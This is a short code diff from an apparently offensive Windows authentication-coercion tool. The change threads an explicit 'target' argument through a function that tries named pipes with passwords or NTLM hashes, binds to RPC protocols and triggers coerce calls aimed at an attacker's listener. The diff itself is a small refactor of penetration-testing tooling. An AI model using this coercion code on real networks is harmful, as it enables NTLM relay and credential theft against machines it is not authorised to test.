@@ -58,19 +58,19 @@ def parseArgs():
     return lmhash, nthash, options
 
 
-def coerce_auth_target(options, lmhash, nthash, all_pipes, available_protocols):
+def coerce_auth_target(options, target, lmhash, nthash, all_pipes, available_protocols):
     for pipe in all_pipes:
         dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, verbose=options.verbose)
         if dce is not None:
             print("   [>] Pipe '%s' is \x1b[1;92maccessible\x1b[0m!" % pipe)
             for protocol in available_protocols:
                 if pipe in protocol.available_pipes:
-                    dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip, verbose=options.verbose)
+                    dce = connect_to_pipe(pipe=pipe, username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip, verbose=options.verbose)
                     if dce is not None:
                         if can_bind_to_protocol(dce, protocol.uuid, protocol.version, verbose=options.verbose):
                             protocol_instance = protocol(verbose=options.verbose)
                             protocol_instance.pipe = pipe
-                            protocol_instance.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip)
+                            protocol_instance.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=target, doKerberos=options.kerberos, dcHost=options.dc_ip, targetIp=options.target_ip)
                             protocol_instance.perform_coerce_calls(options.listener)
         else:
             if options.verbose:
